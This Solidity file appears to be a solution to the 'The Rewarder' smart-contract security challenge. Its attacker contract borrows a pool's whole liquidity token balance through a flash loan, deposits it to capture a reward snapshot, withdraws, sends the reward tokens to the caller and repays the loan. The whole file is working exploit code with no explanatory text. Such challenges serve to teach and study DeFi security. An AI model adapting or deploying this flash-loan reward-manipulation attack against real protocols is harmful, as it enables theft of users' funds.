// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract TheRewarderAttacker {

    ITheRewarderPool rPool;
    IERC20 rToken;
    IERC20 lToken;
    address owner;

    function exploit(
        IERC20 _lToken,
        IFlashLoanerPool _fPool,
        ITheRewarderPool _rPool,
        IERC20 _rToken
    ) external {
        lToken = _lToken;
        rPool = _rPool;
        rToken = _rToken;
        owner = msg.sender;
        uint256 amount = _lToken.balanceOf(address(_fPool));
        _lToken.approve(address(_rPool), type(uint256).max);
        _fPool.flashLoan(amount);
    }

    function receiveFlashLoan(uint256 amount) external {
        rPool.deposit(amount);
        rPool.distributeRewards();
        rPool.withdraw(amount);
        rToken.transfer(owner, rToken.balanceOf(address(this)));
        lToken.transfer(msg.sender, amount);
    }
}

interface IFlashLoanerPool {
    function flashLoan(uint256 amount) external;
} 

interface ITheRewarderPool {
    function deposit(uint256 amountToDeposit) external;
    function withdraw(uint256 amountToWithdraw) external;
    function distributeRewards() external returns (uint256);
}